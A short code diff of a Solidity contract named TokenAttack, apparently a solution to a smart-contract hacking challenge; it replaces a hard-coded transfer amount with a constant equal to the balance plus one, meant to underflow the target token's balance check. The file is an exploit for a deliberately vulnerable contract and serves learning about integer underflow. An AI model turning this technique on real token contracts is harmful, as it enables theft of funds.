@@ -5,8 +5,10 @@ pragma solidity ^0.8.19;
 import {Broadcasted} from "./Broadcasted.sol";
 
 contract TokenAttack is Broadcasted {
+    uint256 internal constant OVERFLOW_VALUE = 20 + 1; // balance + 1
+
     function attack(address payable tokenCtr_) public payable override {
-        IToken(tokenCtr_).transfer(msg.sender, 21);
+        IToken(tokenCtr_).transfer(msg.sender, OVERFLOW_VALUE);
     }
 }
 
